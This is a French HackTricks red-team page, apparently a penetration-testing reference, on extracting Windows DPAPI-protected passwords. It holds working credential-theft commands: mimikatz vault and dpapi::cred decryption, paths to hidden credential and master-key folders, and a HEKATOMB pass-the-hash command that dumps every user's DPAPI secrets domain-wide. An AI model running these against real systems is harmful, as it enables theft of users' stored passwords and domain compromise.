# DPAPI - Extraction de mots de passe

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) est l'événement de cybersécurité le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **la mission de promouvoir les connaissances techniques**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

## Qu'est-ce que DPAPI

L'API de protection des données (DPAPI) est principalement utilisée dans le système d'exploitation Windows pour le **chiffrement symétrique des clés privées asymétriques**, s'appuyant soit sur des secrets utilisateur, soit sur des secrets système comme source significative d'entropie. Cette approche simplifie le chiffrement pour les développeurs en leur permettant de chiffrer des données à l'aide d'une clé dérivée des secrets de connexion de l'utilisateur ou, pour le chiffrement système, des secrets d'authentification de domaine du système, évitant ainsi aux développeurs de gérer eux-mêmes la protection de la clé de chiffrement.

### Données protégées par DPAPI

Parmi les données personnelles protégées par DPAPI, on trouve :

* Les mots de passe et les données de saisie automatique d'Internet Explorer et de Google Chrome
* Les mots de passe des comptes e-mail et FTP internes pour des applications comme Outlook et Windows Mail
* Les mots de passe pour les dossiers partagés, les ressources, les réseaux sans fil et Windows Vault, y compris les clés de chiffrement
* Les mots de passe pour les connexions de bureau à distance, .NET Passport et les clés privées pour divers usages de chiffrement et d'authentification
* Les mots de passe réseau gérés par le Gestionnaire d'identifiants et les données personnelles dans des applications utilisant CryptProtectData, telles que Skype, MSN Messenger, et plus encore

## Liste Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Fichiers d'identification

Les **fichiers d'identification protégés** pourraient être situés dans :
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Obtenez des informations d'identification en utilisant mimikatz `dpapi::cred`, dans la réponse, vous pouvez trouver des informations intéressantes telles que les données chiffrées et le guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Vous pouvez utiliser le **module mimikatz** `dpapi::cred` avec le `/masterkey` approprié pour déchiffrer :
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Master Keys

Les clés DPAPI utilisées pour chiffrer les clés RSA de l'utilisateur sont stockées dans le répertoire `%APPDATA%\Microsoft\Protect\{SID}`, où {SID} est le [**Security Identifier**](https://en.wikipedia.org/wiki/Security\_Identifier) **de cet utilisateur**. **La clé DPAPI est stockée dans le même fichier que la clé maîtresse qui protège les clés privées des utilisateurs**. Elle est généralement constituée de 64 octets de données aléatoires. (Remarque : ce répertoire est protégé, donc vous ne pouvez pas le lister en utilisant `dir` depuis le cmd, mais vous pouvez le lister depuis PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Voici à quoi ressemble un ensemble de clés maîtresses d'un utilisateur :

![](<../../.gitbook/assets/image (1121).png>)

En général, **chaque clé maîtresse est une clé symétrique chiffrée qui peut déchiffrer d'autres contenus**. Par conséquent, **extraire** la **clé maîtresse chiffrée** est intéressant afin de **déchiffrer** plus tard ce **contenu** chiffré avec elle.

### Extraire la clé maîtresse et déchiffrer

Consultez le post [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) pour un exemple de la façon d'extraire la clé maîtresse et de la déchiffrer.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) est un port C# de certaines fonctionnalités DPAPI du projet [Mimikatz](https://github.com/gentilkiwi/mimikatz/) de [@gentilkiwi](https://twitter.com/gentilkiwi).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) est un outil qui automatise l'extraction de tous les utilisateurs et ordinateurs du répertoire LDAP et l'extraction de la clé de sauvegarde du contrôleur de domaine via RPC. Le script résoudra ensuite toutes les adresses IP des ordinateurs et effectuera un smbclient sur tous les ordinateurs pour récupérer tous les blobs DPAPI de tous les utilisateurs et déchiffrer le tout avec la clé de sauvegarde du domaine.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Avec la liste des ordinateurs extraits de LDAP, vous pouvez trouver chaque sous-réseau même si vous ne les connaissiez pas !

"Parce que les droits d'administrateur de domaine ne suffisent pas. Hackez-les tous."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) peut automatiquement extraire des secrets protégés par DPAPI.

## Références

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) est l'événement de cybersécurité le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **la mission de promouvoir les connaissances techniques**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supportez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
